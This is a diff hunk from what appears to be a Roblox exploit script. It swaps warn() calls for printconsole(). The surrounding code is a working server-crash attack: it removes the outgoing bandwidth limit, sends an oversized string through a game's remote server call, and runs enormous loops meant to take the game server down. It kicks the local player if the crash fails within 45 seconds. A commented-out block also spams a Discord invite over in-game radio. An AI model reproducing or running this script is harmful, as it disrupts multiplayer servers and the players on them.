@@ -794,7 +794,7 @@ function C.K_6416498845() -- CL Facility Roleplay
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
-	warn('Sending requests to game server... (This may take some time)')
+	printconsole('Sending requests to game server... (This may take some time)')
 	--for i = 1, 2 do
 --[[
 {
@@ -852,13 +852,13 @@ function C.K_3226555017()
 	printconsole('Crashing..')
 
 	--game:GetService("ReplicatedStorage").Team:FireServer('ScD');
-	warn('Sending request to game server... (This should not take long)')
+	printconsole('Sending request to game server... (This should not take long)')
 
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 	game:GetService('NetworkClient'):SetOutgoingKBPSLimit(math.huge * math.huge)
 
 	game:GetService("ReplicatedStorage").Settings:InvokeServer('Set',{LongString})
-	warn('Client completed sending request!')
+	printconsole('Client completed sending request!')
 --[[
 wait(4)
 warn('Sending discord invite via Radio.')
@@ -872,7 +872,7 @@ wait(.75)
 game:GetService("ReplicatedStorage").Team:FireServer('mainmenu');
 wait(1)
 ]]
-	warn('Attempting to crash...')
+	printconsole('Attempting to crash...')
 	game:GetService('RunService').RenderStepped:Connect(function()
 		for i = 1, 6500 do
 			for i = 1, 900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 do
@@ -884,7 +884,7 @@ wait(1)
 	end)
 
 	wait(45)
-	warn('Client did not crash server within 45 seconds of Get Request.')
+	printconsole('Client did not crash server within 45 seconds of Get Request.')
 	game:GetService('Players').LocalPlayer:Kick('Client did not crash game within 45 seconds of last Get Request')
 
 end
